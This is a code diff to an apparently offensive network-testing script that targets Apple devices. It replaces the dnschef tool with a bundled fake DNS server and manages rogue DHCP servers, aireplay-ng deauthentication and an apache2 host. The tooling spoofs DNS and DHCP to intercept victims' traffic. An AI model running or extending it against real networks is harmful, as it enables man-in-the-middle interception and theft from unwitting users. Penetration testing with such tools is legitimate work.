@@ -50,7 +50,7 @@ args = parser.parse_args()
 # Kill subprocesses
 Base.kill_process_by_name('apple_rogue_dhcp')
 Base.kill_process_by_name('dhcp_rogue_server')
-Base.kill_process_by_name('dnschef')
+Base.kill_process_by_name('dns.py')
 Base.kill_process_by_name('aireplay-ng')
 
 try:
@@ -303,7 +303,6 @@ if __name__ == "__main__":
     Base.print_info("Check OS installed software")
     Base.check_installed_software("apache2")
     Base.check_installed_software("service")
-    Base.check_installed_software("dnschef")
     Base.check_installed_software("ps")
     # endregion
 
@@ -412,35 +411,34 @@ if __name__ == "__main__":
     sleep(2)
     apache2_pid = Base.get_process_pid("apache2")
     if apache2_pid == -1:
-        Base.print_error("Process apache2 is not running!")
+        Base.print_error("Apache2 server is not running!")
         exit(1)
     else:
-        Base.print_info("Process apache2 is running, PID: ", str(apache2_pid))
+        Base.print_info("Apache2 server is running, PID: ", str(apache2_pid))
     # endregion
 
-    # region Dnschef settings
-    Base.print_info("Start dnschef ...")
+    # region DNS server settings
+    Base.print_info("Start DNS server ...")
     try:
-        sub.Popen(['dnschef -i ' + your_ip_address + ' --fakeip=' + your_ip_address +
-                   ' >' + script_dir + '/dnschef.log 2>&1 &'],
+        sub.Popen(['python ' + script_dir + '/Listeners/dns.py -i ' + listen_network_interface + ' -f -q'],
                   shell=True)
     except OSError as e:
         if e.errno == errno.ENOENT:
-            Base.print_error("Program: ", "dnschef", " is not installed!")
+            Base.print_error("Program: ", "python", " is not installed!")
             exit(1)
         else:
-            Base.print_error("Something else went wrong while trying to run ", "`dnschef`")
+            Base.print_error("Something else went wrong while trying to run ", "`dns.py`")
             exit(2)
     # endregion
 
-    # region Check dnschef is running
-    sleep(2)
-    dnschef_pid = Base.get_process_pid("dnschef")
-    if dnschef_pid == -1:
-        Base.print_error("Process dnschef is not running!")
+    # region Check DNS server is running
+    sleep(5)
+    dns_pid = Base.get_process_pid("dns.py")
+    if dns_pid == -1:
+        Base.print_error("DNS server is not running!")
         exit(1)
     else:
-        Base.print_info("Process dnschef is running, PID: ", str(dnschef_pid))
+        Base.print_info("DNS server is running, PID: ", str(dns_pid))
     # endregion
 
     # endregion
@@ -468,9 +466,10 @@ if __name__ == "__main__":
             apple_device = [target_ip, target_mac]
     # endregion
 
-    # region If apple devices are found
+    # region Apple devices are found
 
     if len(apple_device) > 0:
+
         # region Output target IP and MAC address
         target_ip_address = apple_device[0]
         target_mac_address = apple_device[1]
@@ -541,27 +540,22 @@ if __name__ == "__main__":
 
         # endregion
 
-        # region Check apple_rogue_dhcp or dhcp_rogue_server script is run
-        if args.deauth:
-            script_name = "dhcp_rogue_server"
-        else:
-            script_name = "apple_rogue_dhcp"
-
-        rogue_server_pid = 0
-        timeout = 180
+        # region Check DNS server is run
+        script_name = "dns.py"
+        dns_server_pid = 0
+        timeout = 600
         start = time()
 
         while Base.get_process_pid(script_name) != -1:
-
-            # Get rogue server pid
-            rogue_server_pid = Base.get_process_pid(script_name)
 
             # If timeout - kill rogue server process
             if int(time() - start) > timeout:
                 Base.kill_process_by_name('apple_rogue_dhcp')
                 Base.kill_process_by_name('dhcp_rogue_server')
-                Base.kill_process_by_name('dnschef')
+                Base.kill_process_by_name('dns.py')
                 Base.kill_process_by_name('aireplay-ng')
+                sleep(3)
+                break
 
             # Wait
             sleep(10)
